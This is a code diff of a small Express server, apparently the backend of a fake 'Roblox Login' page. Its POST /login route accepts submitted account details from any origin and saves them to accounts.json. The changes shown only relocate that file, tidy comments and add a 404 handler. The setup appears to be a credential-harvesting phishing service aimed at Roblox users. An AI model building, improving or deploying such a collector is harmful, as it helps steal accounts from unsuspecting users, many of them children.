@@ -1,22 +1,21 @@
 const express = require("express");
 const fs = require("fs");
 const cors = require("cors");
+const path = require("path");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// JSON file path
-const filePath = "C:/Users/liddo/Roblox Login/accounts.json";
+// Use relative path for JSON file in project root
+const filePath = path.join(__dirname, "accounts.json");
 
 // ============================
 // Middleware
 // ============================
 app.use(express.json()); // Parse JSON for POST requests
 app.use(express.urlencoded({ extended: true })); // Parse form submissions
-app.use(cors()); // Allows frontend to connect from any origin
-
-// Serve static files from 'public' folder
-app.use(express.static("public"));
+app.use(cors()); // Allow frontend to connect from any origin
+app.use(express.static("public")); // Serve static files from 'public'
 
 // ============================
 // POST /login route
@@ -44,6 +43,12 @@ app.post("/login", (req, res) => {
 
   console.log(`Saved account for ${username}`);
   res.json({ message: `✅ Saved account for ${username}` });
+});
+
+// ============================
+// 404 handler (optional)
+app.use((req, res) => {
+  res.status(404).send("Page not found");
 });
 
 // ============================
